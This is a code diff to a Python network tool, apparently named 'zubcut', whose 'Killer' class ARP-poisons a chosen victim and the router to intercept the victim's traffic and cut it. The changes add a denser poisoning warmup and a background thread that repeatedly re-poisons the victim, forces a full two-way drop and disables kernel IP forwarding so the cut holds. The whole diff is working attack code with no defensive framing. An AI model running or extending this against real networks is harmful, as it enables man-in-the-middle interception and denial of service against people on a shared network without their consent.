@@ -576,6 +576,9 @@ class Killer:
         ``traffic_cut=False`` arms ARP MITM only (Percent Cut / link shaping set their
         own forwarder pass ratios — calling kill() with the default 0% cut first made
         Percent Cut feel like a full Kill until OFF).
+
+        Instant cut order (must stay first): poison → ARP worker → 0% traffic cut.
+        Forwarding disable + full-cut reinforce run only after that arm.
         """
         self._sync_iface_for_victim(victim, refresh_router=not ics_mode)
         self._refresh_victim_mac_from_cache(victim)
@@ -587,12 +590,20 @@ class Killer:
         self._stop_forwarder(mac)
         # Instant path first: poison + cut. Forwarding disable / probes come after.
         self._poison_arp_now(victim, seq, repeats=3, delay_s=0)
-        self._kill_arp_worker(victim, wait_after, seq)
+        self._kill_arp_worker(
+            victim,
+            wait_after,
+            seq,
+            aggressive=bool(traffic_cut and not ics_mode),
+        )
         if not ics_mode and traffic_cut:
             self._apply_traffic_cut_sync(victim)
         if not ics_mode:
             # After cut is armed — seal kernel relay without delaying the first hit.
             disable_ip_forwarding(priority_iface=getattr(self.iface, 'name', None))
+        if not ics_mode and traffic_cut:
+            # Background only: reseal poison/cut/forwarding without delaying the click.
+            self._reinforce_full_cut_async(victim)
 
     def _apply_traffic_cut_sync(self, victim):
         """Start 100% drop forwarder on the caller thread (Kill must not miss re-arm)."""
@@ -632,6 +643,79 @@ class Killer:
             return
         seq = int(self._op_seq.get(mac, 0))
         self._poison_arp_now(victim, seq, repeats=max(1, int(repeats)), delay_s=0)
+
+    def _seal_hard_drop(self, mac) -> bool:
+        """Ensure a live forwarder hard-drops both directions (full Kill)."""
+        fw = self.forwarders.get(mac)
+        if not (fw and getattr(fw, 'running', False)):
+            return False
+        try:
+            fw.drop_from_victim = True
+            fw.drop_to_victim = True
+            fw.pass_from_victim_pct = 0
+            fw.pass_to_victim_pct = 0
+            return True
+        except Exception:
+            return False
+
+    def reinforce_full_cut(self, victim, *, rounds=4):
+        """
+        Post-instant Kill seal: re-poison, reseal 0% hard-drop, retry forwarder,
+        and re-disable kernel IP forwarding.
+
+        Never call this before the instant poison/cut path — it is a background
+        follow-up for environments where the first hit only feels like lag.
+        Does not bump ``_op_seq`` (would cancel the live ARP worker).
+        """
+        if not isinstance(victim, dict):
+            return
+        mac = victim.get('mac')
+        if not mac or mac not in self.killed:
+            return
+        rounds = max(1, min(8, int(rounds)))
+        for i in range(rounds):
+            if mac not in self.killed:
+                return
+            self.reassert_poison(victim, repeats=4)
+            if not self._seal_hard_drop(mac):
+                # Forwarder missing/dead — retry full cut (still post-instant).
+                self._apply_traffic_cut_sync(victim)
+                self._seal_hard_drop(mac)
+            disable_ip_forwarding(priority_iface=getattr(self.iface, 'name', None))
+            if i + 1 < rounds:
+                sleep(0.05 + (0.05 * i))
+
+    def _reinforce_full_cut_async(self, victim) -> None:
+        """Schedule ``reinforce_full_cut`` off the Kill click / GUI thread."""
+        if not isinstance(victim, dict):
+            return
+        snap = {
+            'mac': victim.get('mac'),
+            'ip': victim.get('ip'),
+            'vendor': victim.get('vendor'),
+        }
+        if not snap.get('mac'):
+            return
+
+        def _work() -> None:
+            try:
+                # Yield so the instant arm returns / UI paints first.
+                sleep(0.02)
+                if snap.get('mac') not in self.killed:
+                    return
+                live = self.killed.get(snap['mac']) or snap
+                self.reinforce_full_cut(live if isinstance(live, dict) else snap)
+            except Exception:
+                pass
+
+        try:
+            threading.Thread(
+                target=safe_daemon_target(_work),
+                name='zubcut-kill-full-cut',
+                daemon=True,
+            ).start()
+        except Exception:
+            pass
 
     def _poison_frames(self, victim):
         """Unicast ARP poison only (victim + router).
@@ -888,12 +972,17 @@ class Killer:
         disable_ip_forwarding(priority_iface=getattr(self.iface, 'name', None))
 
     @threaded
-    def _kill_arp_worker(self, victim, wait_after=2, seq=0):
+    def _kill_arp_worker(self, victim, wait_after=2, seq=0, *, aggressive=False):
         frames = self._poison_frames(victim)
 
-        # Front-load several short-interval reasserts so a missed first poison
-        warmup_remaining = 4
-        warmup_gap = 0.08
+        # Front-load short-interval reasserts so a missed first poison still sticks.
+        # Kill (traffic_cut) uses a denser warmup; Lag/PctCut keep the lighter cadence.
+        if aggressive:
+            warmup_remaining = 8
+            warmup_gap = 0.05
+        else:
+            warmup_remaining = 4
+            warmup_gap = 0.08
         while (
             victim['mac'] in self.killed
             and self.iface.name != 'NULL'
